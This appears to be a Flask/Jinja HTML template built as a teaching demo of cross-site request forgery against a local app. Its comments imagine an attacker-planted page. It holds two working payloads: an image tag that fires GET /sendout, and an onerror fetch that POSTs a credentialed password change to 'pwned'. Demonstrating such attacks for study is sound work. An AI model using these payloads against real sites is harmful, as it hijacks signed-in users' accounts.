{% extends 'base.html' %}

{% block header %}
  <h1>{% block title %}Exploit{% endblock %}</h1>
{% endblock %}

{% block content %}
   <!-- 
        Imagine that such IMG has been placed on the site by an attacker (e.g. due to XSS vulnerability) 
        and any user signed in on the target domain visits this page.
    -->
    <img src="http://localhost:5000/sendout"></img>

    <!--
        Another example of malicious content that demonstrates CSRF attack.
        This time it triggers the malicious POST request and it will success if a user is signed in.
    -->
    <img src="#" onerror="fetch('http://localhost:5000/password',{credentials:'include',method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({new_password: 'pwned'})})"></img>
{% endblock %}